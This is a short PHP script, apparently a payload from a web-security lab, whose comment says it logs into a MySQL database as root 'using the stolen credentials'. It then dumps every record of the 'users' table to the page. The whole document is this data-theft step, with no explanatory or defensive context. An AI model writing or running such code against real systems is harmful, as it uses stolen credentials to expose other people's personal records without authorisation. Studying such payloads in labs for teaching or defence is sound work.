<?php
// Connect using the stolen credentials
$link = mysqli_connect("mysql", "root", "foobar", "employees");

// Get all the data from the users table
$re = mysqli_query($link, "SELECT * FROM users");

// Show the data
echo "<pre>";
while ($row = mysqli_fetch_assoc($re)) {
    var_dump($row);
}
echo "</pre>";
